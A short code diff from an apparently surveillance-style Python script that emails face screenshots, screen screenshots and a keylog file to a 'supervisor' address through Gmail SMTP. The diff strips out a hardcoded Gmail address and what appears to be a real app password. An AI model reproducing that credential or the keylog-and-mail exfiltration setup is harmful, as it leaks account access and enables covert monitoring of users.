@@ -22,9 +22,9 @@ font = cv2.FONT_HERSHEY_SIMPLEX
 # Email details using Gmail SMTP server
 SMTP_SERVER = 'smtp.gmail.com'
 SMTP_PORT = 587
-SENDER_EMAIL = 'vp7714532@gmail.com'  # Sender email
-SENDER_PASSWORD = 'tekb kyvd ynrf buzs'  # Use the App Password generated from Gmail
-SUPERVISOR_EMAIL = 'vp7714532@gmail.com'  # Supervisor email (same as sender)
+SENDER_EMAIL = '_____________'  # Sender email
+SENDER_PASSWORD = '____________'  # Use the App Password generated from Gmail
+SUPERVISOR_EMAIL = '___________'  # Supervisor email (same as sender)
 
 # Function to send an email with attachments
 def send_email_with_attachments(face_screenshot, screen_screenshot, keylog_file):
